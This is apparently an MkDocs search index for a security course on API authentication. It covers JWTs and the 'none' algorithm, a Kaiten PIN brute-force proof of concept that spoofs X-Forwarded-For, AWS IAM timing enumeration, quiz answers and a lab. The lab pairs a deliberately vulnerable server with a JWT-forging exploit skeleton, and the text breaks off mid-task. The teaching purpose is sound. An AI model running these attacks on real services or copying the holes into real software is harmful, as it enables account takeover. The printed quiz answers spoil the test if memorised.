{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"01-API-Authentication/0-Overview/","title":"Overview","text":""},{"location":"01-API-Authentication/0-Overview/#topics","title":"Topics","text":"<p>This module introduces the critical concepts of API authentication, focusing on the importance of securing sensitive data and verifying user identities. It covers:</p> <ul> <li> <p>Key authentication methods such as Basic Authentication, API Keys, JSON Web Tokens (JWTs), and OAuth.</p> </li> <li> <p>Strengths and limitations of different approaches.</p> </li> <li> <p>Factors to consider when selecting an authentication method, including security, scalability, and user experience.</p> </li> </ul>"},{"location":"01-API-Authentication/0-Overview/#real-examples","title":"Real Examples","text":"<p>Two real-world case studies are presented to highlight authentication vulnerabilities and their implications:</p> <ul> <li> <p>Kaiten: A rate-limiting bypass vulnerability was exploited using the <code>X-Forwarded-For header</code>, enabling brute-force attacks to guess PINs.</p> </li> <li> <p>AWS IAM: A timing-based username enumeration flaw revealed valid usernames due to response-time differences in the authentication flow.</p> </li> </ul> <p>Both examples illustrate common weaknesses in API authentication and provide practical solutions to mitigate risks.</p>"},{"location":"01-API-Authentication/0-Overview/#practice","title":"Practice","text":"<p>The practice section includes hands-on exercises to simulate and understand authentication vulnerabilities:</p> <ul> <li> <p>Obtain a Valid JWT: Analyze a legitimate JWT to understand its structure and the data it contains.</p> </li> <li> <p>Forge a JWT: Experiment with creating a forged JWT to bypass authentication mechanisms and access restricted endpoints.</p> </li> </ul> <p>These exercises offer practical experience in identifying and addressing authentication vulnerabilities in API implementations.</p>"},{"location":"01-API-Authentication/1-Background/","title":"Introduction to API authentication","text":"<p>In this module, we will explore the various authentication concerns in APIs and how they can be exploited. By the end, you will know how to secure APIs effectively and prevent similar attacks when you implement an API.</p>"},{"location":"01-API-Authentication/1-Background/#authentication","title":"Authentication","text":"<p>To integrate with different software or services, APIs will often define methods to share data and perform actions. For example, you might be familiar with delivery services. These services use APIs to share location data and estimated arrival times so you can stay updated. Because APIs often handle sensitive data, we expect only relevant parties can see our data.</p> <p>It would be wrong if anyone can access each other's data. That is why at the core of any API is authentication. This is a process that verifies the identity of a user to ensure only authorized people can access the API. We need authentication to secure sensitive data and ensure privacy and data integrity.</p>"},{"location":"01-API-Authentication/1-Background/#authentication-methods","title":"Authentication Methods","text":"<p>When it comes to authentication, there are several methods available, each with its own use cases. These methods provide the necessary security and verification to ensure only authorized users can interact with the API.</p> <p>Basic Authentication: This is an older HTTP-based authentication scheme that lets users send their username and password as plain text in the HTTP request. This means it is easier to implement, but it is now considered outdated and insecure with most services requiring more secure methods.</p> <p>API Keys: This is a simple and commonly used method, where a unique key is assigned to each user and must be included in each API request. This ensures that the user is identified and authorized to access the API, but these keys can be hard to manage and distribute in large environments.</p> <p>JSON Web Tokens: This is a stateless and compact method to authenticate users. JWTs encode user credentials into a token, which is then sent with each API request. This means the server does not need to store session information, which makes JWTs a scalable solution to authenticate users.</p> <p>OAuth: This is a more advanced and secure protocol that allows users to grant third-party services access to their resources without sharing their actual credentials. It provides a safe and convenient way for users to log in to services using their existing social media accounts or other platforms.</p> <p>Each method has its own uses cases. To decide which method is best, we have to think about the security requirements, user experience, and scalability. For example, API keys are secure but it could be awkward for everyday use on a social media platform. But with proper authentication, we can secure sensitive data and maintain the integrity of the API.</p>"},{"location":"01-API-Authentication/2-1-JWTs/","title":"Introduction to JSON Web Tokens","text":""},{"location":"01-API-Authentication/2-1-JWTs/#jwts","title":"JWTs","text":"<p>JSON Web Tokens (JWTs) were created to safely send data between systems. It uses a token, or compact string, to contain any kind of data, but is most commonly used to send information about users as part of authentication.</p> <p>What makes JWTs different from other authentication methods is that it stores all the data a server needs on the client side. This makes JWTs a popular choice when it comes to highly distributed services that scale.</p> <p>To better understand this, let's look at a JSON Web Token:</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.\nKMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30\n</code></pre> <p>To make it easier to read, we split this token to show each part on its own line. While this token might look random, it is actually JSON data that has been encoded. This makes it very compact and easy to send in an API.</p> <p>The encoding used for JWTs is Base64Url, a variation of Base64 encoding that is URL-safe. This encoding ensures that the token can easily be sent in HTTP headers and URLs without issues. Base64Url encoding makes the token compact and easy to handle in API calls and can be decoded to see the data.</p> <pre><code>// URL-safe variant of Base64\nfunction b64(str) {\n    return new Buffer(str).toString('base64')\n                          .replace(/=/g, '')\n                          .replace(/\\+/g, '-')\n                          .replace(/\\//g, '_');\n}\n</code></pre> <p>If you decode this token, you will find information about the user that received this token. When a user sends a request to the API, they can use their token to tell the API their identity and what permissions they have.</p> <p>For example, this user is an admin called John Doe.</p> <pre><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.\n</code></pre> <pre><code>{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true,\n  \"iat\": 1516239022\n}\n</code></pre> <p>By using JWTs, you can create secure and scalable systems where user information is reliably verified with each request. This makes JWTs an excellent choice for modern web applications and distributed services.</p>"},{"location":"01-API-Authentication/2-1-JWTs/#jwt-format","title":"JWT Format","text":"<p>A JWT is made of three parts: the header, the payload, and the signature. Each part is encoded separately before being combined into the final token. These are all separated by a dot, as shown in the previous example.</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.\nKMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30\n</code></pre> <p>In most cases, the header typically has two fields: the signing algorithm and the type of token. The signing algorithm tells the server what algorithm to use to verify the signature. And the type depends but is usually always JWT.</p> <pre><code>{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n</code></pre> <p>The payload contains all the information about the user. These are called \"claims\", and some are defined by the JWT spec. But, you will most likely define your own \"claims\" that aligns with what you need to authenticate.</p> <pre><code>{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true,\n  \"iat\": 1516239022\n}\n</code></pre> <p>By now, you might have noticed that the data inside the token can easily be read or modified by anyone with access to the token. Because of this, the security of any JWT-based authentication is heavily reliant on the signature.</p>"},{"location":"01-API-Authentication/2-1-JWTs/#jwt-signature","title":"JWT Signature","text":"<p>The signature can tell us if the token was tampered with. To create a signature we use the encoded header, encoded payload, a secret, and the algorithm specified in the header. This is signed to create a secure token.</p> <p>For example, let's say we want to use the HMAC SHA256 algorithm:</p> <pre><code>HMACSHA256(\n  base64UrlEncode(header) + \".\" +\n  base64UrlEncode(payload),\n  secret)\n</code></pre> <p>When we combine these parts together we can create a signature:</p> <pre><code>KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30\n</code></pre> <p>Anytime the API gets a JWT, we can use the signature to verify the content it has. This is because it is derived from the rest of the token, so changing a single byte in the header or payload will result in a mismatched signature.</p>"},{"location":"01-API-Authentication/2-1-JWTs/#jwt-security","title":"JWT Security","text":"<p>As you work with JWTs, you will notice how flexible they are. With JWTs, you can decide many implementation details to fit your use case. This is by design, making JWTs very adaptable, however, this flexibility can lead to vulnerabilities if not handled properly, even when using well-tested libraries.</p> <p>For example, one common mistake happens when the signature is not verified properly. Because the token tells the server what signing algorithm to use, an attacker can confuse the server with an algorithm it does not use, or trick the server by telling it there was no signing algorithm used at all.</p> <p>This is the <code>none</code> algorithm specified in the JWT spec.</p> <pre><code>{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n</code></pre> <p>When the signature is not verified properly, this is known as an unsecure token. As a result, an attacker can modify the token to gain complete access.</p> <p>To avoid this, we need to implement proper checks and validations on the server side. For example, always ensure that the server only accepts specified algorithms and rejects tokens with none or any unsupported algorithms.</p> <pre><code>const allowedAlgorithms = [\n  'HS256', // HMAC using SHA-256\n  'RS256', // RSASSA PKCS1 v1.5 using SHA-256\n  'ES256'  // ECDSA using P-256 and SHA-256\n];\n</code></pre> <p>But, even if the signature is robustly verified, the security of JWTs relies heavily on the server's secret key staying a secret. If this key is leaked, guessed, or brute-forced, an attacker can generate a valid signature for any token. This would compromise the entire authentication mechanism.</p>"},{"location":"01-API-Authentication/2-2-Broken-Authentication/","title":"Broken authentication","text":""},{"location":"01-API-Authentication/2-2-Broken-Authentication/#broken-authentication","title":"Broken Authentication","text":"<p>In APIs, we sometimes need to authenticate users to control what data they can access and the actions they can perform. This is because APIs often handle sensitive data, so we need robust authentication to verify the users.</p> <p>Broken Authentication is a vulnerability that happens when the API fails to properly authenticate users, which means unauthorized users could gain access to the API and its resources. This vulnerability usually happens because of weak credentials, misconfigurations, or wrong implementation.</p> <p>To better understand this, let's say we have an API that uses JWTs to authenticate users and we have an endpoint that returns sensitive data.</p> <pre><code>@app.route('/sensitive-data', methods=['GET'])\ndef sensitive_data():\n    token = request.headers.get('Authorization').split()[1]\n    try:\n        decoded = jwt.decode(token, options={'verify_signature': VERIFY_SIGNATURE})\n        return jsonify({'data': 'This is secured data'}), 200\n    except jwt.InvalidTokenError:\n        return jsonify({'message': 'Unauthorized'}), 401\n</code></pre> <p>When a user wants to access their data, a request is made to the <code>sensitive-data</code> endpoint. This will return any data about the user if their token is valid. However, an attacker might try to tamper and modify their token to steal another user's data, so we try to verify the token signature.</p> <p>But during development and testing phases, it might be easier to disable signature verification, so we include a <code>VERIFY_SIGNATURE</code> option to determine whether the token's signature should be verified. Developers can set this option locally using environment variables which is loaded after.</p> <p>This option, along with other data is managed in a <code>Settings</code> config.</p> <pre><code>class Settings:\n    JWT_SECRET_KEY = os.getenv(\"JWT_SECRET_KEY\", generate_random_secret())\n\n    # someone needs to remember to set this variable to True in env variables\n    JWT_VERIFY_SIGNATURE = os.getenv(\"JWT_VERIFY_SIGNATURE\")\n</code></pre> <p>However, when the application was deployed to production, the signature verification was mistakenly left disabled, leading to broken authentication. This means an attacker, could skip the signature and access the endpoint.</p> <pre><code>{\n  \"data\": \"This is secured data\"\n}\n</code></pre>"},{"location":"01-API-Authentication/2-2-Broken-Authentication/#handle-broken-authentication","title":"Handle Broken Authentication","text":"<p>To address this issue, we need to ensure that the signature will always be verified. This is a simple misconfiguration mistake that can be fixed easily by setting <code>True</code> as the default value for <code>JWT_VERIFY_SIGNATURE</code>.</p> <pre><code>class Settings:\n    JWT_SECRET_KEY = os.getenv(\"JWT_SECRET_KEY\", generate_random_secret())\n\n    JWT_VERIFY_SIGNATURE = os.getenv(\"JWT_VERIFY_SIGNATURE\", True)\n</code></pre> <p>By using default values, we can ensure that important options are securely set to reduce the risk of broken authentication due to misconfiguration.</p>"},{"location":"01-API-Authentication/3-1-Real-Example/","title":"Real Example 1","text":""},{"location":"01-API-Authentication/3-1-Real-Example/#kaiten","title":"Kaiten","text":"<p>API authentication is a process that checks whether users are allowed to access data or features of an application. It helps protect sensitive information and functions by making sure only authorized users can use the API. If the authentication process is weak or done improperly, malicious users can exploit this vulnerability to gain unauthorized access.</p> <p>To fully understand the result of weak or improper authentication, we will cover a real example found in Kaiten. This is a project management tool designed to streamline workflows and improve team collaboration. In this real example, we will cover a rate limit bypass to learn how weak security mechanisms can create opportunities for attackers to exploit.</p>"},{"location":"01-API-Authentication/3-1-Real-Example/#rate-limiting","title":"Rate Limiting","text":"<p>Rate limiting is a security measure designed to control the number of requests a client can make within a specific time frame. This mechanism helps prevent abuse, like brute force attacks, by limiting client requests.</p> <p>In Kaiten, their rate limiter identified and tracked client requests using their IP address. This mechanism is applied across Kaiten's API to protect various endpoints. By monitoring the number requests originating from a specific IP address, the rate limiter ensures that clients cannot send excess requests.</p>"},{"location":"01-API-Authentication/3-1-Real-Example/#rate-limit-bypass","title":"Rate Limit Bypass","text":"<p>In this real example, Kaiten tried to secure their PIN code authentication mechanism with rate limiting. They understood that by limiting the number of attempts, they can prevent attackers from guessing the correct PIN code.</p> <p>Their rate limiter restricted the number of attempts from a single client by using their IP address to identify and track requests. However, they failed to account for the <code>X-Forwarded-For</code> header, which is commonly used by proxies to specify the original IP address of the client making the request.</p> <p>This oversight meant that attacks could manipulate the header to spoof different IP addresses, effectively bypassing the rate limiter. By automating this process with a script, attackers could try all possible combinations of the 6-digit PIN to increase their chance of gaining unauthorized access.</p>"},{"location":"01-API-Authentication/3-1-Real-Example/#proof-of-concept","title":"Proof of Concept","text":"<p>To bypass the rate limiter, we need to identify the endpoints where PIN and login requests are processed. In this case it is the <code>/pin</code> and <code>/login?redirectPath=%2F</code> endpoints. We also need to prepare all PIN codes.</p> <pre><code>pin_url = \"https://kaiten.example.com/pin\"\nlogin_url = \"https://kaiten.example.com/login?redirectPath=%2F\"\n\npin_list = [f\"{i:06}\" for i in range(1000000)]  # Generates all 6-digit PINs\n</code></pre> <p>After we have identified the endpoints and created a list of PIN codes, the next step is to request a PIN code so we perform a brute force attack. This will be a POST request to the login endpoint with the target username.</p> <pre><code>def request_pin():\n    data = {\"username\": \"admin\"}\n    response = requests.post(login_url, json=data)\n\n    if \"not found\" in response.text:\n        print(\"User does not exist.\")\n        sys.exit(1)\n</code></pre> <p>The last step is to write the main logic to perform a brute force attack. We will use a <code>for</code> loop to go over each PIN code, sending each attempt to the pin endpoint. We spoof our IP address using the current PIN code.</p> <pre><code>def brute_force_pin():\n    for pin in pin_list:\n        # 1. Spoof the IP address using the current PIN\n        headers = {\n            \"X-Forwarded-For\": f\"127.0.0.{pin}\"\n        }\n\n        data = {\n            \"username\": \"admin\",\n            \"pin\": pin\n        }\n\n        # 2. Send the POST request\n        response = requests.post(pin_url, headers=headers, json=data)\n\n        # 3. Check the response\n        if response.status_code in range(200, 300):\n            print(f\"Valid PIN found: {pin}\")\n            print(response.json())\n            sys.exit(0)\n</code></pre> <p>This loop automates the brute force attack by cycling through the PIN code list, sending each attempt to the pin endpoint. At the end, we include a delay before we can request a new PIN if our brute force attack failed.</p> <pre><code>while True:\n    request_pin()\n    brute_force_pin()\n    print(\"No valid PIN found, restarting the process...\")\n    time.sleep(300)  # Pause for 5 minutes before retrying\n</code></pre> <p>In total, we can try about 150 requests per second. Kaiten keeps a PIN code valid for only 5 minutes, but before the PIN expires we can try 45,000 times to guess the PIN code. Within 4 hours we will likely guess the correct PIN code. From this, we can learn that rate limiting should not only restrict based on the IP address but also consider other factors to make it effective.</p>"},{"location":"01-API-Authentication/3-1-Real-Example/#mitigations","title":"Mitigations","text":"<p>To prevent attacks that exploit rate limiting flaws, we should implement additional security measures that address different brute force strategies.</p> <p>Account Lockouts: Introduce temporary account lockouts after a number of failed login attempts. For example, locking an account for 15 minutes after 5 failures can discourage brute force attacks and limit automated scripts.</p> <p>CAPTCHA Challenges: Use CAPTCHA challenges on login pages, especially after repeated failed attempts. This introduces a manual step that disrupts automated attacks while allowing users to continue accessing their accounts.</p> <p>The real example found in Kaiten demonstrates how rate limiting, while useful, must be implemented as part of a larger security framework to effectively prevent attacks. Rate limiting alone remains vulnerable to exploits by persistent and well-prepared attackers.</p> <p>By including other security measures, we can design a strong and secure authentication process to protect the information and functions of our API.</p>"},{"location":"01-API-Authentication/3-2-Real-Example/","title":"Real Example 2","text":""},{"location":"01-API-Authentication/3-2-Real-Example/#aws-iam","title":"AWS IAM","text":"<p>API authentication is a process that checks whether users are allowed to access data or features of an application. It helps protect sensitive information and functions by making sure only authorized users can use the API. If the authentication process is weak or done improperly, malicious users can exploit this vulnerability to gain unauthorized access.</p> <p>To fully understand the result of weak or improper authentication, we will cover a real example found in AWS Identity and Access Management (IAM). This is a service designed to securely manage access to AWS resources. In this real example, we will cover a username enumeration vulnerability to learn how improper security mechanisms can create opportunities for attackers to exploit.</p>"},{"location":"01-API-Authentication/3-2-Real-Example/#login-flow","title":"Login Flow","text":"<p>The AWS IAM login flow is designed to authenticate users attempting to access AWS resources. The process starts when a user submits their username and password through the AWS IAM login portal. The system then validates the credentials against the stored records so they can login.</p> <p></p> <p>The login flow is designed to verify both the username and password before granting access. However, the system's behavior during this process, such as response times or error messages, can help an attacker infer whether a username is valid or invalid because of subtle timing differences.</p>"},{"location":"01-API-Authentication/3-2-Real-Example/#username-enumeration","title":"Username Enumeration","text":"<p>In this real example, AWS gives users the option to include multi-factor authentication (MFA). They understood that by including multiple login methods, users can make it harder for attackers to steal their account.</p> <p></p> <p>However, because this is an optional feature, not all users will use MFA. For those that don't, the login flow will only check the username and password to verify a user. Generally, the username is checked before continuing with the password. This means if the username exists, there will be an additionally check on the password. This is a subtle but measurable timing difference.</p>"},{"location":"01-API-Authentication/3-2-Real-Example/#proof-of-concept","title":"Proof of Concept","text":"<p>To check if this was true, researchers at Rhino Security Labs created a test account with the username <code>bfme-console</code>. They made sure MFA was disabled and recorded the response times compared to other users.</p> <p>Through this experiment, they recorded about a 100ms increase in the response time for users without MFA. This timing difference is too small for people to notice, but a script can measure these differences accurately.</p> <p>This means attackers can create a list of possible usernames and determine whether it is valid based on these timing differences. In addition, the attackers will also know that these accounts will not have MFA enabled.</p>"},{"location":"01-API-Authentication/3-2-Real-Example/#mitigations","title":"Mitigations","text":"<p>To prevent attacks that exploit username enumeration vulnerabilities, we should implement additional measures that address this attack vector. These measures help maintain the confidentiality of user accounts.</p> <p>Uniform Response Times: Ensure that the server responds with the same delay for valid and invalid usernames. By making response times consistent regardless of whether a username exists or not, attackers cannot infer whether a username is valid based on timing differences.</p> <p>Generic Error Messages: Replace specific error messages such as \"Invalid username\" with more generic responses like \"Authentication failed.\" This prevents attackers from identifying valid usernames from invalid ones.</p> <p>The real example found in AWS demonstrates how timing attacks can exploit subtle flaws in the authentication process. By including other security measures, we can design a strong and secure authentication process to protect the information and functions of our API.</p>"},{"location":"01-API-Authentication/4-1-MCQ-Practice/","title":"Practice","text":""},{"location":"01-API-Authentication/4-1-MCQ-Practice/#multiple-choice","title":"Multiple Choice","text":"<p>Question 1: Which of the following methods provides the most secure way to authenticate users in an API?</p> <ul> <li>A. Basic authentication with plaintext passwords.</li> <li>B. API keys passed in query parameters.</li> <li>C. Token-based authentication using signed JWTs.</li> <li>D. IP-based authentication without additional credentials.</li> </ul> <p>Correct Answer: C</p> <p>Question 2: Which of the following is the most effective strategy to mitigate brute-force attacks in API authentication?</p> <ul> <li>A. Increase the length of passwords required during registration.</li> <li>B. Implement account lockout after consecutive failed login attempts.</li> <li>C. Store hashed passwords in the database.</li> <li>D. Use symmetric encryption for transmitted credentials.</li> </ul> <p>Correct Answer: B</p> <p>Question 3: A company decides to use facial recognition as the primary method for API authentication in its apps. Which of the following poses the greatest ethical and security risk?</p> <ul> <li>A. Reduced convenience for users due to technical failures.</li> <li>B. Inadequate protection for biometric data against theft or misuse.</li> <li>C. Difficulty in scaling facial recognition technology across devices.</li> <li>D. Increased reliance on machine learning algorithms to process biometric data.</li> </ul> <p>Correct Answer: B</p> <p>Question 4: Consider the following login function:</p> <pre><code>@app.route('/login', methods=['POST'])\ndef login():\n    username = request.json.get('username')\n    password = request.json.get('password')\n\n    # Hardcoded credentials\n    if username == \"admin\" and password == \"password123\":\n        return jsonify({\"message\": \"Login successful\"}), 200\n    return jsonify({\"error\": \"Invalid credentials\"}), 401\n</code></pre> <p>What is the primary vulnerability in this implementation?</p> <ul> <li>A. Hardcoded credentials can be easily guessed or leaked.</li> <li>B. The <code>password123</code> is stored securely but can be brute-forced.</li> <li>C. The username is hardcoded, but the password is dynamically validated.</li> <li>D. Weak passwords are encrypted improperly during transmission.</li> </ul> <p>Correct Answer: A</p> <p>Question 5: Consider the following token validation implementation:</p> <pre><code>@app.route('/validate', methods=['POST'])\ndef validate_token():\n    token = request.headers.get('Authorization')\n    if not token:\n        return jsonify({\"error\": \"Unauthorized\"}), 401\n\n    # Misconfiguration: signature verification disabled during development\n    decoded = jwt.decode(token, options={\"verify_signature\": False})\n    return jsonify({\"message\": \"Token is valid\"}), 200\n</code></pre> <p>What is the result of the misconfiguration in this code?</p> <ul> <li>A. Token expiration claims are ignored, resulting in prolonged validity.</li> <li>B. Signature verification causes the API to reject all tokens.</li> <li>C. The decoding process fails due to missing headers in the token.</li> <li>D. Any token can bypass signature validation and be accepted.</li> </ul> <p>Correct Answer: D</p> <p>Question 6: Consider this API authentication flow:</p> <pre><code>@app.route('/login', methods=['POST'])\ndef login():\n    email = request.json.get('email')\n    code = request.json.get('access_code')\n    if authenticate(email, code):\n        return jsonify({\"message\": \"Access granted\"}), 200\n    return jsonify({\"error\": \"Access denied\"}), 403\n</code></pre> <p>The developer is asked to add IP rate limiting to prevent abuse. Which approach BEST integrates this feature?</p> <ul> <li>A. Create a blacklist of IPs that exceed a predefined request limit.</li> <li>B. Validate the client\u2019s access code and IP address before processing login requests.</li> <li>C. Use middleware to track and enforce limits on requests per IP address.</li> <li>D. Limit the number of authentication attempts allowed globally.</li> </ul> <p>Correct Answer: C</p> <p>Question 7: How did attackers bypass Kaiten's rate limiting mechanism?</p> <ul> <li>A. They used a dictionary attack to guess PINs.</li> <li>B. They spoofed multiple IP addresses using the <code>X-Forwarded-For</code> header.</li> <li>C. They exploited an endpoint that didn't require authentication.</li> <li>D. They injected malicious SQL queries into the PIN request payloads.</li> </ul> <p>Correct Answer: B</p> <p>Question 8: In the provided proof of concept, why was the delay between retries important for the brute force attack?</p> <ul> <li>A. It synchronized with the expiration time of the generated PIN.</li> <li>B. It allowed the attackers to generate new PIN codes dynamically.</li> <li>C. It ensured PIN codes were guessed in sequential order.</li> <li>D. It prevented the server from detecting abnormal behavior.</li> </ul> <p>Correct Answer: A</p> <p>Question 9: In AWS IAM, what optional feature introduced timing differences that could be exploited for username enumeration?</p> <ul> <li>A. Session-based authentication</li> <li>B. Single sign-on (SSO)</li> <li>C. Role-based access control</li> <li>D. Multi-factor authentication (MFA)</li> </ul> <p>Correct Answer: D</p> <p>Question 10: Why were timing differences in AWS IAM's authentication flow measurable during login attempts?</p> <ul> <li>A. They revealed valid usernames by checking passwords before usernames.</li> <li>B. They occurred only for usernames associated with administrator roles.</li> <li>C. Valid usernames triggered additional checks, resulting in slight delays.</li> <li>D. Invalid usernames generated server errors, causing longer delays.</li> </ul> <p>Correct Answer: C</p>"},{"location":"01-API-Authentication/4-2-Lab-Practice/","title":"Practice","text":"<p>This exercise puts you in a scenario similar to the one in the modules, where attackers exploited JWT authentication. Here, you will focus on simulating the potential impact and explore different types of attacks. This practice highlights the risks and consequences of weak or improper authentication.</p>"},{"location":"01-API-Authentication/4-2-Lab-Practice/#environment-setup","title":"Environment Setup","text":"<p>For this exercise, we will use Python to create a script to interact with a vulnerable API. The script will be used to send forged JWTs to exploit weak or improper JWT authentication. Before we start, we will create a virtual environment to isolate the dependencies we need for this exercise.</p> <p>Virtual Environment: A Python virtual environment is a self-contained directory that isolates different Python dependencies, allowing you to manage different versions of libraries for each project without conflicts.</p> <pre><code># Create a virtual environment\npython -m venv .venv\n\n# Then activate the virtual environment\n\n# On Windows\n.venv\\Scripts\\activate\n\n# On Unix or MacOS\nsource .venv/bin/activate\n</code></pre> <p>Install Requirements: This exercise uses external libraries and frameworks for the script and API. The dependencies we will need are Requests, Python-JOSE, and FastAPI to create, send, and receive JWTs through the API.</p> <pre><code># Install Requests\npython -m pip install requests\n\n# Install Python-JOSE\npython -m pip install python-jose\n\n# Install FastAPI\npython -m pip install \"fastapi[standard]\"\n</code></pre>"},{"location":"01-API-Authentication/4-2-Lab-Practice/#the-vulnerable-program","title":"The Vulnerable Program","text":"<p>The vulnerable program used in this exercise is called <code>server.py</code>. This program is a simple API with an endpoint to receive a JWT and a protected endpoint to use the JWT. This program is vulnerable to forged JWTs, and you will explore how to exploit this to access protected endpoints.</p> <pre><code># Save this as server.py\nfrom datetime import datetime, timedelta, timezone\n\nfrom fastapi import FastAPI, Header, HTTPException\nfrom jose import JWTError, jwt\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\n# Secret keys for demonstration purposes\nSECRET_KEY = \"insecure_secret_key\"\nALGORITHM = \"HS256\"\n\n# Fake user database with roles\nfake_user_db = {\n    \"user1\": {\"password\": \"password123\", \"role\": \"user\"},\n    \"admin\": {\"password\": \"admin123\", \"role\": \"admin\"},\n}\n\n\n# Input model for receiving credentials\nclass LoginRequest(BaseModel):\n    username: str\n    password: str\n\n\n# Generates a JWT\ndef create_access_token(data: dict):\n    to_encode = data.copy()\n    to_encode[\"exp\"] = datetime.now(timezone.utc) + timedelta(minutes=15)\n    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)\n\n\n# Endpoint to receive a JWT if credentials are valid\n@app.post(\"/login\")\ndef login(request: LoginRequest):\n    username = request.username\n    password = request.password\n    user = fake_user_db.get(username)\n\n    if not user or user[\"password\"] != password:\n        raise HTTPException(status_code=401, detail=\"Invalid credentials\")\n\n    access_token = create_access_token({\"sub\": username, \"role\": user[\"role\"]})\n    return {\"access_token\": access_token, \"token_type\": \"bearer\"}\n\n\n# Endpoint to access the admin data\n@app.get(\"/admin\")\ndef admin_data(authorization: str = Header(...)):\n    try:\n        # Extract the token from the \"Authorization: Bearer &lt;token&gt;\" header\n        token = authorization.split(\"Bearer \")[-1]\n\n        # Decode the JWT\n        data = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM], options={\"verify_signature\": False})\n\n        # Check the user's role\n        if data.get(\"role\") != \"admin\":\n            raise HTTPException(status_code=403, detail=\"Forbidden: You do not have admin privileges.\")\n\n        return {\"message\": \"Welcome admin!\"}\n    except JWTError:\n        # Handle cases where the token decode fails\n        raise HTTPException(status_code=401, detail=\"Invalid token\")\n</code></pre>"},{"location":"01-API-Authentication/4-2-Lab-Practice/#the-exploit-program","title":"The Exploit Program","text":"<p>The exploit program used in this exercise is called <code>exploit.py</code>. This program is a script that can make requests to the vulnerable API. This will demonstrate how attackers can forge JWTs to access protected endpoints.</p> <pre><code># Save this as exploit.py\n\nimport base64\nimport json\n\nimport requests\n\n# Base URL of the API server\nBASE_URL = \"http://127.0.0.1:8000\"\n\n\n# Task 1: Obtain a valid JWT\ndef get_valid_token(username, password):\n    \"\"\"Logs in with credentials and retrieves the JWT.\"\"\"\n    # Prepare the request data\n    endpoint = \"...\"\n    credentials = {...}\n\n    response = requests.post(endpoint, json=credentials)\n\n    if response.status_code == 200:\n        # Retrieve the JWT token\n        token = response.json().get(\"access_token\")\n        print(f\"Valid JWT Token: {token}\")\n\n        # Decode the JWT token (splitting into header, payload, and signature)\n        header, payload, signature = token.split(\".\")\n        decoded_header = base64.urlsafe_b64decode(header + \"==\").decode()  # Decode header\n        decoded_payload = base64.urlsafe_b64decode(payload + \"==\").decode()  # Decode payload\n\n        # Display the decoded header and payload\n        print(\"\\nDecoded Header:\")\n        print(json.loads(decoded_header))\n        print(\"\\nDecoded Payload:\")\n        print(json.loads(decoded_payload))\n\n        return token\n    else:\n        print(f\"Failed to retrieve token: {response.status_code} - {response.json()}\")\n\n\n# Task 2: Forge a JWT to Escalate Privileges\ndef forge_token():\n    \"\"\"Creates a forged JWT.\"\"\"\n    # Prepare the JWT data\n    header = {\n        \"alg\": \"...\",\n        \"typ\": \"...\",\n    }\n    payload = {\n        \"sub\": \"...\",\n        \"role\": \"...\",\n    }\n\n    # Encode the header and payload as base64 URL-safe strings\n    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().strip(\"=\")\n    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().strip(\"=\")\n\n    # Construct the token without a signature\n    forged_token = \"...\"\n\n    print(f\"Forged JWT: {forged_token}\")\n    return forged_token\n\n\ndef use_token(endpoint, token):\n    \"\"\"Uses a JWT token to access an endpoint.\"\"\"\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n\n    response = requests.get(endpoint, headers=headers)\n\n    try:\n        print(f\"Response: {response.status_code} - {response.json()}\")\n    except ValueError:\n        print(f\"Response: {response.status_code} - {response.text}\")\n\n\nif __name__ == \"__main__\":\n    print(\"Task 1: Obtain a Valid JWT\")\n    username = \"user1\"\n    password = \"password123\"\n    valid_token = get_valid_token(username, password)\n\n    # Uncomment to run Task 2\n\n    # print(\"\\nTask 2: Forge a JWT to Escalate Privileges\")\n    # admin_endpoint = f\"{BASE_URL}/admin\"\n    # forged_token = forge_token()\n    # use_token(admin_endpoint, forged_token)\n</code></pre>"},{"location":"01-API-Authentication/4-2-Lab-Practice/#common-commands","title":"Common Commands","text":"<p>In the following, we list some common commands for this exercise.</p> <pre><code># Start the exploit script\npython /path/to/exploit.py\n\n# Start the server for the API\nfastapi dev /path/to/server.py\n\n# To stop the server press CTRL+C to quit\n</code></pre>"},{"location":"01-API-Authentication/4-2-Lab-Practice/#task-1-obtain-a-valid-jwt","title":"Task 1: Obtain a valid JWT","text":"<p>In this task, we will simulate how an attacker might attempt to learn about the authentication process by first obtaining a valid JWT. Your goal is to prepare the request data to log in and receive a JWT using valid credentials.</p> <pre><code>def get_valid_token(username, password):\n    ...\n    # Prepare 